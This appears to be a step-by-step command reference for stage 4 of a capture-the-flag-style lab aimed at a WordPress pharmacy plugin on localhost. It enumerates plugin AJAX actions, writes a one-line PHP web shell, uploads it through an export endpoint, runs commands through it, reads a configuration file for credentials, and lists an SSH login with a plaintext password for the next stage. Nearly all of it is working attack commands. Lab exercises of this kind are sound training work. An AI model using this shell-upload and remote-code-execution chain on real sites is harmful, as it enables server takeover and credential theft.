# Command Reference - Stage 4

## Step 1: Check Homepage
```bash
curl -s http://localhost | grep -i "hint"
```

## Step 2: Enum AJAX Endpoints
```bash
for action in pharmacy_export pharmacy_sync pharmacy_data pharmacy_upload; do
  echo "=== $action ==="
  curl -s -X POST "http://localhost/wp-admin/admin-ajax.php?action=$action" -d "test=1"
  echo ""
done
```

## Step 3: Create & Upload Shell
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -s -X POST -F "export_file=@/tmp/shell.php" \
  "http://localhost/wp-admin/admin-ajax.php?action=pharmacy_export" | jq .
```

## Step 4: Test RCE
```bash
curl -s "http://localhost/wp-content/uploads/pharmacy/shell.php?cmd=id"
```

## Step 5: Extract Credentials
```bash
curl -s "http://localhost/wp-content/uploads/pharmacy/shell.php?cmd=cat%20/var/www/html/wp-content/pharmacy_config.php"
```

## Step 6: Connect to Stage 5
```bash
ssh pharmacy_admin@stage5.internal.pharmacy.local
# Password: PharmacyPass_2025
```

